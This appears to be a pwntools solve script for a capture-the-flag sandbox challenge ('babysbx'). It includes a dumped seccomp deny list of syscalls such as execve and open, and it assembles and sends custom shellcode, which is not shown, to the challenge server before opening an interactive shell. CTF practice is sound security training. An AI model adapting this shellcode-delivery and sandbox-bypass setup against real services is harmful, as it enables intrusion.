#!/usr/bin/env python3
from pwn import *
from subprocess import run

# =========================================================
#                          SETUP                         
# =========================================================
exe = './babysbx'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'challs.airoverflow.com', 33784

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *validate+452
break *validate+637
break *main+212
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x0c 0xc000003e  if (A != ARCH_X86_64) goto 0014
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x09 0xffffffff  if (A != 0xffffffff) goto 0014
#  0005: 0x15 0x08 0x00 0x00000000  if (A == read) goto 0014
#  0006: 0x15 0x07 0x00 0x00000001  if (A == write) goto 0014
#  0007: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0014
#  0008: 0x15 0x05 0x00 0x0000003b  if (A == execve) goto 0014
#  0009: 0x15 0x04 0x00 0x000000bb  if (A == readahead) goto 0014
#  0010: 0x15 0x03 0x00 0x0000010b  if (A == readlinkat) goto 0014
#  0011: 0x15 0x02 0x00 0x00000127  if (A == preadv) goto 0014
#  0012: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0014
#  0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0014: 0x06 0x00 0x00 0x00000000  return KILL

# blacklist => syscall; mov; int 0x80;

def exploit():
    global io
    io = initialize()

    run("nasm -f bin shellcode.asm -o shellcode.bin", shell=True, check=True)
    shellcode = open("shellcode.bin", "rb").read()

    io.sendlineafter(b'shellcode:', shellcode)

    io.interactive()
    
if __name__ == '__main__':
    exploit()